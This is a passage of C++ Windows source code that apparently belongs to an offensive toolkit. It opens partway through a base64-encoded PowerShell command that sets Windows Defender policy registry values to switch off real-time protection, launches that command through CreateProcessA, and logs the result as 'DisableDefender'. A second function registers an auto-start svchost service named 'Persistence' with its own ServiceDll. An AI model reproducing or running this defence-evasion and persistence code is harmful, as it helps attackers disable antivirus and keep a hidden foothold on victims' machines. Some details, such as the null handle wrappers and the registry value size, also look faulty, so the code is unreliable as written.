BvAG4AaQB0AG8AcgBpAG4AZwAnACAALQBWAGEAbAB1AGUAIAAxACAALQBUAHkAcABlACAARABXAE8AUgBEACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEMAbwBuAHQAaQBuAHUAZQA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwAUgBlAGEAbAAtAFQAaQBtAGUAIABQAHIAbwB0AGUAYwB0AGkAbwBuACcAIAAtAE4AYQBtAGUAIAAnAEQAaQBzAGEAYgBsAGUAUwBjAGEAbgBPAG4AUgBlAGEAbAB0AGkAbQBlAEUAbgBhAGIAbABlACcAIAAtAFYAYQBsAHUAZQAgADEAIAAtAFQAeQBwAGUAIABEAFcATwBSAEQAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsA";

	if (!CreateProcessA(
		NULL,
		const_cast<LPSTR>(cmd.c_str()),
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&siStartInfo,
		&piProcInfo
	)) {
		Log("[!] Failed to create DisableDefender powershell process." + std::to_string(GetLastError()), componentName);
		return 5;
	}
	else {
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
		CloseHandle(g_hChildStd_OUT_Wr);
		CloseHandle(g_hChildStd_IN_Rd);
		Log("[+] Successfully created DisableDefender powershell process.", componentName);
	}

	Sleep(500);

	DWORD dwRead, dwWritten;
	CHAR chBuf[4096];

	for (;;)
	{
		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, 4096, &dwRead, NULL);
		if (!bSuccess || dwRead == 0) break;
	}

	retStr = std::string(chBuf);

	Log("[*] Output from DisableDefender powershell process: " + retStr, componentName);

	return 0;
}

int CreatePersistService() {
	SC_HANDLE hSCManager = NULL;
	SC_HANDLE hService = NULL;
	std::unique_ptr<void, decltype(&CloseHandle)> uphSCManager(static_cast<void*>(hSCManager), CloseHandle);
	std::unique_ptr<void, decltype(&CloseHandle)> uphService(static_cast<void*>(hService), CloseHandle);

	// open service manager
	hSCManager = OpenSCManagerW(
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS
	);

	if (hSCManager == NULL) {
		return 1;
	}

	// create the service
	hService = CreateServiceW(
		hSCManager,
		L"Persistence",
		L"Persistence",
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_SHARE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		L"C:\\Windows\\System32\\svchost.exe -k WinSysPersist",
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (hService == NULL) {
		return 2;
	}
	
	// configure the service dll path
	HKEY hKey;
	LSTATUS s = RegCreateKeyExW(
		HKLM,
		L"SYSTEM\\CurrentControlSet\\services\\Persistence\\Parameters",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WRITE,
		NULL,
		&hKey,
		NULL
	);

	if (s != ERROR_SUCCESS) {
		
		return 3;
	}

	s = RegSetKeyValueW(
		hKey,
		NULL,
		L"ServiceDll",
		REG_EXPAND_SZ,
		dllPath,
		sizeof(LPCSTR)+1
	);

	// optionally set service group

	return 0;
}